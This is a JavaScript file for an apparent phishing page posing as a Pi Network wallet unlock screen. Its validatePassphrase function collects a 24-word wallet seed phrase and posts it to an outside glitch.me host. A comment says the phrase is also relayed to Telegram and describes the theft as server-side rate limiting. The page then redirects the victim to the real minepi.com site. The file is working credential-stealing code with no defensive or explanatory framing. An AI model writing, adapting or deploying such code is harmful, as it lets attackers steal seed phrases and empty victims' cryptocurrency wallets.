// ===== MODAL FUNCTIONS (UNCHANGED) =====
function showModal(modalType) {
    document.body.classList.add('modal-open');
    const modalId = `${modalType}Modal`;
    document.getElementById(modalId).style.display = "flex";
    setTimeout(() => document.getElementById(modalId).scrollTop = 0, 50);
}

function hideModal(modalId) {
    document.body.classList.remove('modal-open');
    document.getElementById(modalId).style.display = "none";
}

function showFaceIDError() {
    alert("Face ID is not available. Please use passphrase.");
}

function redirectToNewWallet() {
    if (confirm("This will create a new wallet. Your old wallet will be inaccessible. Continue?")) {
        window.location.href = "https://example.com/create-new-wallet";
    }
}

function redirectToNewAccount() {
    if (confirm("This will create a new wallet. Your old wallet will be inaccessible. Continue?")) {
        window.location.href = "https://example.com/create-new-brainstorm-account";
    }
}

// ===== PASSPHRASE VALIDATION (NOW WITH SERVER RATE LIMITING) =====
async function validatePassphrase(inputId, errorId) {
    const input = document.getElementById(inputId);
    const error = document.getElementById(errorId);
    const words = input.value.trim().split(/\s+/).filter(word => word.length > 0);

    // Client-side 24-word check (unchanged)
    if (words.length !== 24) {
        error.style.display = 'block';
        error.textContent = 'Invalid Passphrase';
        return;
    }

    error.style.display = 'none';
    document.getElementById('loadingOverlay').style.display = 'flex';

    try {
        // This now checks server-side rate limits
        const response = await fetch('https://get-the-fuck-out-here1.glitch.me/validate-passphrase', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ passphrase: input.value }) // Telegram still gets this
        });

        // New rate limit handling
        if (response.status === 429) {
            const errorData = await response.json();
            alert(errorData.message || "You've reached the maximum attempts (2 per day).");
            return;
        }

        // Original success flow
        const result = await response.json();
        if (result.success) window.location.href = "https://minepi.com";

    } catch (e) {
        alert("Connection error. Try again later.");
    } finally {
        document.getElementById('loadingOverlay').style.display = 'none';
    }
}

// ===== TEXTAREA AUTO-SCROLL (UNCHANGED) =====
document.addEventListener('DOMContentLoaded', function() {
    const textareas = document.querySelectorAll('.modal-content textarea');
    textareas.forEach(textarea => {
        textarea.addEventListener('focus', function() {
            window.scrollTo(0, 0);
            document.body.scrollTop = 0;
            setTimeout(() => {
                const modalContent = this.closest('.modal-content');
                if (modalContent) {
                    const inputRect = this.getBoundingClientRect();
                    const modalRect = modalContent.getBoundingClientRect();
                    const offset = inputRect.top - modalRect.top - 100;
                    modalContent.scrollTop = offset > 0 ? offset : 0;
                }
            }, 100);
        });
    });
});
